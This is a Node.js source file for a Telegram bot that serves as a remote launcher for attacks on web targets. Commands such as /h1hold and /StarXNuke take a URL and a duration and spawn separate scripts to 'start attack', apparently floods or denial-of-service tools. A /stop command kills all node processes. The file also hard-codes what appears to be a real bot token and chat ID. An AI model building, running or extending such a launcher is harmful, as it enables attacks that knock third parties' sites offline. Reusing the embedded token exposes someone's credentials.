const TelegramBot = require('node-telegram-bot-api');
const { exec, spawn } = require('child_process');
const express = require('express');
const path = require('path');

// ✅ Your Telegram Bot Token & Chat ID
const TOKEN = "7095538437:AAFNebiEtU_3JkgVZX1Ggfjo2hKlA4izjCA";
const CHAT_ID = "1377150939";

// Initialize Telegram Bot
const bot = new TelegramBot(TOKEN, { polling: true });

// ✅ Function to check if Node.js is installed
const checkNodeInstalled = () => {
    return new Promise((resolve) => {
        exec('node -v', (error) => {
            resolve(!error);
        });
    });
};

// ✅ Function to check and install missing Node.js modules
const installNodeModules = () => {
    return new Promise((resolve, reject) => {
        exec('npm list node-fetch', (error, stdout) => {
            if (stdout.includes('empty')) {
                console.log("📦 Installing missing Node.js module: node-fetch@2");
                exec('npm install node-fetch@2', (err) => {
                    err ? reject(err) : resolve();
                });
            } else {
                resolve();
            }
        });
    });
};

// ✅ Function to send a message via Telegram
const sendMessage = async (url) => {
    try {
        await bot.sendMessage(CHAT_ID, `🚀 Received URL: ${url}`);
        console.log(`Message sent to Telegram: ${url}`);
    } catch (error) {
        console.error(`❌ Error sending message: ${error.message}`);
    }
};

// ✅ Telegram Command: Start `h1hold.js`
bot.onText(/\/h1hold (.+)/, async (msg, match) => {
    const url = match[1];
    const chatId = msg.chat.id;

    await bot.sendMessage(chatId, `⚡ Checking system and starting attack on: ${url}`);

    if (!(await checkNodeInstalled())) {
        return bot.sendMessage(chatId, "❌ Node.js is not installed. Please install Node.js first.");
    }

    try {
        await installNodeModules();
        const process = spawn('node', ['h1hold.js', url]);

        process.stdout.on('data', (data) => console.log(`h1hold.js: ${data}`));
        process.stderr.on('data', (data) => console.error(`Error: ${data}`));

        bot.sendMessage(chatId, "✅ Attack started! Check logs for details.");
    } catch (error) {
        bot.sendMessage(chatId, `❌ Error: ${error.message}`);
    }
});

// ✅ Telegram Command: Start `StarXNuke.js`
bot.onText(/\/StarXNuke (.+) (.+)/, async (msg, match) => {
    const url = match[1];
    const time = match[2];
    const chatId = msg.chat.id;

    await bot.sendMessage(chatId, `⚡ Starting StarXNuke attack on: ${url} for ${time} seconds`);

    if (!(await checkNodeInstalled())) {
        return bot.sendMessage(chatId, "❌ Node.js is not installed. Please install Node.js first.");
    }

    try {
        await installNodeModules();
        const process = spawn('node', ['StarXNuke.js', url, time]);

        process.stdout.on('data', (data) => console.log(`StarXNuke.js: ${data}`));
        process.stderr.on('data', (data) => console.error(`Error: ${data}`));

        bot.sendMessage(chatId, "✅ StarXNuke attack started! Check logs for details.");
    } catch (error) {
        bot.sendMessage(chatId, `❌ Error: ${error.message}`);
    }
});

// ✅ Telegram Command: Stop Attack
bot.onText(/\/stop/, async (msg) => {
    exec('pkill -f node', (error) => {
        if (error) {
            return bot.sendMessage(msg.chat.id, `❌ Error stopping attacks: ${error.message}`);
        }
        bot.sendMessage(msg.chat.id, "🛑 All attacks have been stopped.");
    });
});

// ✅ Telegram Command: Phone Support
bot.onText(/\/call_support/, (msg) => {
    bot.sendMessage(msg.chat.id, "📞 Contact Support at: +1234567890");
});

// ✅ Telegram Command: Help Menu
bot.onText(/\/help/, (msg) => {
    const helpText = `
🛠 **Available Commands:**
✅ \`/h1hold <URL>\` - Start attack on a URL using \`h1hold.js\`
✅ \`/StarXNuke <URL> <Time>\` - Start attack using \`StarXNuke.js\`
✅ \`/stop\` - Stop all attacks
✅ \`/call_support\` - Get support contact number
✅ \`/help\` - Show this help message
`;
    bot.sendMessage(msg.chat.id, helpText, { parse_mode: "Markdown" });
});

// ✅ Flask API Alternative with Express
const app = express();
const PORT = 8000;

app.get('/send', (req, res) => {
    const url = req.query.url;
    if (!url) {
        return res.json({ status: "Error", message: "No URL provided" });
    }
    sendMessage(url);
    res.json({ status: "Message sent" });
});

// ✅ Start Express Server
app.listen(PORT, () => {
    console.log(`API is running at http://0.0.0.0:${PORT}`);
});

console.log("🤖 Telegram bot is running...");
